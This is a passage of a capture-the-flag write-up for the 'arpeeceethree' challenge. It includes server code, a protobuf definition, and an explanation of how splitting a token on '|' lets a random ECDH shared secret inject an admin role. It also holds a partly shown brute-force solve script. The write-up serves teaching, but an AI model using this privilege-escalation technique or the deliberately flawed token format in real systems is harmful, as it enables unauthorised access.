        logging.info(&amp;#34;ERROR: Invalid sessionId: {}&amp;#34;.format(sessionId)) 
        send_message(resp)
        return spb.FAILURE

    # parse request
    if SESSIONS[msg.sessionId][&amp;#39;completed_challenge&amp;#39;] == False or &amp;#39;client_token&amp;#39; not in SESSIONS[msg.sessionId]:
        resp.status = spb.FAILURE
        resp.encMsg = b&amp;#39;&amp;#39;
        resp.encMsgTag = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;ERROR: challenge not completed for this session&amp;#34;)
        send_message(resp)
        return spb.FAILURE

    token = SESSIONS[msg.sessionId][&amp;#39;client_token&amp;#39;]
    role = bytes_to_long(token.split(b&amp;#39;|&amp;#39;)[1])
    
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2) 

    if role == spb.ADMIN:
        plain = b&amp;#39;Congratulations - here is your flag: &amp;#39; &amp;#43; flag
    else:
        plain = b&amp;#39;Welcome USER!&amp;#39;

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    (cipher, tag) = a.encrypt_and_digest(plain)

    # send response    

    resp.status = spb.SUCCESS
    resp.encMsg = cipher
    resp.encMsgTag = tag
    logging.info(&amp;#34;SUCCESS: message sent&amp;#34;) 
    send_message(resp)

    return spb.SUCCESS

def register_user(USERS, name, pubkey, role = spb.USER):
    len_db = len(USERS)
    uid = len_db &amp;#43; 1
    USERS.append( {&amp;#34;name&amp;#34;: name, &amp;#34;pubkey&amp;#34;: pubkey, &amp;#34;uid&amp;#34;:uid, &amp;#34;role&amp;#34;: role} )
    logging.debug(&amp;#34;users = {}&amp;#34;.format(USERS))
    return uid

if __name__ == &amp;#34;__main__&amp;#34;:
    
    logging.debug(&amp;#34;creating sessions database&amp;#34;)
    # create session database
    SESSIONS = {}

    logging.debug(&amp;#34;creating admin user&amp;#34;)
    # create admin user
    server_ecdh = ECDH(curve=NIST256p)
    server_ecdh.generate_private_key()
    server_public_key = server_ecdh.get_public_key()
    spub = server_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)
    
    logging.debug(&amp;#34;creating user database&amp;#34;)
    # create user database
    USERS = []
    register_user(USERS, b&amp;#34;admin&amp;#34;, spub, role = spb.ADMIN)  


    logging.debug(&amp;#34;starting message loop&amp;#34;)
    while True:
       m  = recv_message()
       if m != None:
           if m.type == spb.MSG_REGISTER_REQUEST:
               handle_register_request(m)
               continue
           elif m.type == spb.MSG_LOGIN_REQUEST:
               ret = handle_login_request(SESSIONS, m)
               continue
           elif m.type == spb.MSG_LOGIN_CHALLENGE:
               ret = handle_login_challenge_request(SESSIONS, USERS, m)
               continue
           elif m.type == spb.MSG_MESSAGE_REQUEST:
               handle_message_request(SESSIONS, m)
               continue
           else:
               logging.error(&amp;#34;Unknown message type, exitting...&amp;#34;)
               exit(0)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;327845196&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;327845196&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;proto&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.proto&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-proto&#34; &gt;&lt;code&gt;
syntax = &amp;#34;proto2&amp;#34;;

package server;

enum MessageType {
	MSG_LOGIN_REQUEST=0;
	MSG_LOGIN_RESPONSE=1;
	MSG_LOGIN_CHALLENGE=2;
	MSG_LOGIN_CHALLENGE_RESPONSE=3;
	MSG_REGISTER_REQUEST=4;
	MSG_REGISTER_RESPONSE=5;
	MSG_MESSAGE_REQUEST=6;
	MSG_MESSAGE_RESPONSE=7;
}

enum Status {
		SUCCESS = 0;
		FAILURE = 1;
	}

enum Role {
		USER = 0;
		ADMIN = 1;
	}

message MessageHeader {
	required uint32 msglen = 1;
	required MessageType type = 2;
}

message RegisterRequest {
	required MessageType type = 1;
	required bytes name = 2;
	required bytes clientPublicKey = 3;
}

message RegisterResponse {
	required MessageType type = 1;
	required uint32 uid = 2;
	required Status status = 3;
}

message LoginRequest {
	required MessageType type = 1;
	required uint32 uid = 2;
}

message LoginResponse {
	required MessageType type = 1;
	required bytes sessionId = 2;
	required bytes challenge = 3;
	required bytes ephemeralServerPublicKey = 4;
	required Status status = 5;
}

message LoginChallenge {
	required MessageType type = 1;
	required bytes sessionId = 2;
	required bytes challengeResponse = 3;
	required bytes ephemeralClientPublicKey = 4;
}

message LoginChallengeResponse {
	required MessageType type = 1;
	required bytes sessionId = 2;
	required Status status = 3; 
}
	
message MessageRequest {
	required MessageType type = 1;
	required bytes sessionId = 3;
}

message MessageResponse {
	required MessageType type = 1;
	required Status status = 2;
	required bytes encMsg = 3;
	required bytes encMsgTag = 4;
}

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We also need to run the command in the server file &lt;code&gt;protoc -I=. --python_out=. ./server.proto&lt;/code&gt;, to generate &lt;code&gt;server_pb2.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There&amp;rsquo;s a lot of code to go through, but I&amp;rsquo;ll try to explain the relevant parts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The server handles registering new users and logging in.&lt;/li&gt;
&lt;li&gt;To register, the client provides a public key, which must be on the NIST256p curve, then the public key is stored alongside their user id (&lt;code&gt;uid&lt;/code&gt;), name and role.&lt;/li&gt;
&lt;li&gt;To login, there are two steps.
&lt;ul&gt;
&lt;li&gt;Firstly, the server generates a random challenge and public key, and sends it to us.&lt;/li&gt;
&lt;li&gt;Then we must sign the challenge with our public key and send the signature to the server, which checks if the signature is valid. If so, the server calculates the shared secret with its private key and our public key. The server then stores our info (shared secret, role, uid, session id) in a &lt;code&gt;token&lt;/code&gt;, and sends us our session id.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;We can also request a message, providing a session id. The server retrieves the token corresponding to our session, and checks if we have the admin role. If we do, we get the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I don&amp;rsquo;t think there&amp;rsquo;s anything wrong with the procedures described above, but I noticed our info was being stored in the token in a very bad way:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handle_login_challenge_request&lt;/span&gt;(SESSION, USERS, msg):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shared_secret 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; long_to_bytes(clientRole) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; long_to_bytes(uid) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sessionId
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The server then uses &lt;code&gt;|&lt;/code&gt; as a delimeter to seperate our info later on:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handle_message_request&lt;/span&gt;(SESSIONS, msg):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SESSIONS[msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sessionId][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;client_token&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    role &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(token&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; role &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; spb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ADMIN:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        plain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Congratulations - here is your flag: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        plain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Welcome USER!&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;bytes_to_long(token.split(b&#39;|&#39;)[1])&lt;/code&gt; retrieves the role by splitting with &lt;code&gt;|&lt;/code&gt; and getting the second element. This means if we can inject a &lt;code&gt;|&lt;/code&gt; character into the token somehow, we could trick it into thinking we have the admin role. However, it seems like we can&amp;rsquo;t control any info in the token, which are &lt;code&gt;shared_secret&lt;/code&gt;, &lt;code&gt;clientRole&lt;/code&gt;, &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;sessionId&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;But it turns out, the admin role &lt;code&gt;spb.ADMIN&lt;/code&gt; is actually just the number &lt;code&gt;1&lt;/code&gt;, and since &lt;code&gt;shared_secret&lt;/code&gt; is essentially random bytes, there is a chance that it could contain the &lt;code&gt;|&lt;/code&gt; character.&lt;/p&gt;
&lt;p&gt;This is what &lt;code&gt;token&lt;/code&gt; usually looks like:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;shared_secret   |role| uid| session id
...\xc3\x87\xf0|\x00|\x02|c8e9fd09-0cb1-4d6c-88d3-53596a98fccb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But what if &lt;code&gt;shared_secret&lt;/code&gt; happened to end with &lt;code&gt;|\x01&lt;/code&gt;?&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;shared_secret   |role| uid| session id
...\xc3\x87|\x01|\x00|\x02|c8e9fd09-0cb1-4d6c-88d3-53596a98fccb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now the second element when splitting by &lt;code&gt;|&lt;/code&gt; is &lt;code&gt;\x01&lt;/code&gt;, the admin role!&lt;/p&gt;
&lt;p&gt;Since &lt;code&gt;shared_secret&lt;/code&gt; is basically random bytes, there is a 1 in $256^2$ which is 1 in 65536 chance that it ends with &lt;code&gt;|\x01&lt;/code&gt; in which the server thinks we&amp;rsquo;re admin, giving us the flag. This actually meant if you ran the client script, unmodified, enough times, you would get the flag. So I did pretty much that, with slight optimizations.&lt;/p&gt;
&lt;p&gt;65536 is not a lot, but probably not a good idea connecting to the server that many times. Luckily, we can create users and login multiple times over the same connection, so we didn&amp;rsquo;t have to open many connections.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(host, port)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; create_user()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    uid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; register(s,e)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; tqdm(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (sessionId, chal, sepk) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; login(s, uid)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ceph &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; login2(s, e, sessionId, chal)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# calculate shared secret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        server_ephemeral_public_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; VerifyingKey&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_string(sepk, NIST256p)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ceph&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load_received_public_key(server_ephemeral_public_key)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        shared_secret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ceph&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;generate_sharedsecret_bytes()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# if shared secret ends with |\x01 , request for the flag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# (we aren&amp;#39;t explicitly checking for |\x01 because there is a chance&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# it could end with |\x00\x01 etc., which is still valid, slightly increasing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# our chances)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        token  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shared_secret
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; long_to_bytes(spb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;USER)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        role &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(token&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; role &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; spb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ADMIN:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request_msg(s, sessionId, uid, ceph, sepk)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Got the flag: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;msg &lt;span style=&#34;color:#e6db74&#34;&gt;= }&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            exit()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After ~30 minutes and running multiple instances, we actually got the flag: &lt;code&gt;cybears{Wh1ch_pr0gr4m_d0_j3d1_us3_t0_op3n_PDF_f1l35?Ad0b3_W4n_K3n0b1!}&lt;/code&gt;&lt;/p&gt;

  &lt;img src=&#34;./img/got_the_fricking_flag.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;p&gt;Full solve script:



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;372896145&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;372896145&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;remote_brute.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
&amp;#39;&amp;#39;&amp;#39;

python3 client.py -r arpeeceethree.chal.cybears.io:2323



&amp;#39;&amp;#39;&amp;#39;

from pwn import * 
from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError
import sys 
import argparse

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey



def send_message(s, msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to a TPC/IP socket &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    s.send(mh.SerializeToString() &amp;#43; data)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None


def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message(s):
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= s.recv(1)
        try:
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e:
            pass

    # Receive the message data
    data = s.recv(header.msglen)

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None:
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            return msg
        except _DecodeError:
            return None
    else:
        return None

def create_user():
    client_ecdh = ECDH(curve=NIST256p)
    client_ecdh.generate_private_key()
    return client_ecdh

def register(s, ecdh, name=b&amp;#39;bumblebear&amp;#39;, pubkey=b&amp;#39;&amp;#39;):
    ## REGISTER
    rr = spb.RegisterRequest()
    rr.type = spb.MSG_REGISTER_REQUEST
    rr.name = name
    if pubkey == b&amp;#39;&amp;#39;:
        rr.clientPublicKey = ecdh.get_public_key().to_string(encoding=&amp;#39;compressed&amp;#39;)
    else:
        rr.clientPublicKey = pubkey

    send_message(s, rr)

    ## REGISTER RESPONSE
    reg_resp = recv_message(s)
    if reg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(reg_resp))
    if reg_resp.status == spb.FAILURE:
        log.error(&amp;#34;failed to register&amp;#34;)
    uid = reg_resp.uid
    return uid

def login(s, uid):
    ## LOGIN
    l = spb.LoginRequest()
    l.type = spb.MSG_LOGIN_REQUEST
    l.uid = uid
    send_message(s, l)

    ## LOGIN RESPONSE
    login_resp = recv_message(s)
    if login_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(login_resp))
    
    return login_resp.sessionId, login_resp.challenge, login_resp.ephemeralServerPublicKey


def login2(s, ecdh, sessionId, challenge):
    ## SIGN CHALLENGE
    sig = ecdh.private_key.sign_deterministic(challenge)

    ## GENERATE EPHEMERAL DH SESSION KEY
    client_ephemeral_ecdh = ECDH(curve=NIST256p)
    client_ephemeral_ecdh.generate_private_key()
    client_ephemeral_public_key = client_ephemeral_ecdh.get_public_key()

    send_chal = spb.LoginChallenge()
    send_chal.type = spb.MSG_LOGIN_CHALLENGE
    send_chal.sessionId = sessionId
    send_chal.ephemeralClientPublicKey = client_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    send_chal.challengeResponse = sig
    send_message(s, send_chal)

    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    return client_ephemeral_ecdh

def request_msg(s, sessionId, uid, client_ephemeral, server_ephemeral):
    ## REQUEST MESSAGE
    # log.info(&amp;#34;sending message request&amp;#34;)
    msg_req = spb.MessageRequest()
    msg_req.type = spb.MSG_MESSAGE_REQUEST
    msg_req.sessionId = sessionId

    send_message(s, msg_req)

    # log.info(&amp;#34;receiving message&amp;#34;)
    msg_resp = recv_message(s)
    if msg_resp != None:
        pass
        # log.info(&amp;#34;DEBUG: received {}&amp;#34;.format(msg_resp))

    ## DECRYPT MESSAGE
    server_ephemeral_public_key = VerifyingKey.from_string(server_ephemeral, NIST256p)

    client_ephemeral.load_received_public_key(server_ephemeral_public_key)
    shared_secret = client_ephemeral.generate_sharedsecret_bytes()

    token  = shared_secret
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(spb.USER)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid)
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2)

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    message = a.decrypt_and_verify(msg_resp.encMsg, msg_resp.encMsgTag)

    # log.info(&amp;#34;message received: {}&amp;#34;.format(message))
    return message

from tqdm import tqdm

if __name__ == &amp;#34;__main__&amp;#34;:

    parser = argparse.ArgumentParser()
    parser.add_argument(&amp;#39;-r&amp;#39;, &amp;#39;--remote&amp;#39;, help=&amp;#34;The address:port of the remote server hosting the challenge&amp;#34;, required=True)
    args = parser.parse_args()

    if args.remote != None:
        host = args.remote.split(&amp;#34;:&amp;#34;)[0]
        port = int(args.remote.split(&amp;#34;:&amp;#34;)[1])
    else:
        exit(0)

    logging.root.setLevel(logging.ERROR)

    while True:
        s = remote(host, port)
        e = create_user()
        uid = register(s,e)
        for i in tqdm(range(0, 1000)):
            (sessionId, chal, sepk) = login(s, uid)
            ceph = login2(s, e, sessionId, chal)

            # calculate shared secret
            server_ephemeral_public_key = VerifyingKey.from_string(sepk, NIST256p)
            ceph.load_received_public_key(server_ephemeral_public_key)
            shared_secret = ceph.generate_sharedsecret_bytes()

            # if shared secret ends with |\x01 , request for the flag
            # (we aren&amp;#39;t explicitly checking for |\x01 because there is a chance
            # it could end with |\x00\x01 etc., which is still valid, slightly increasing
            # our chances)
            token  = shared_secret
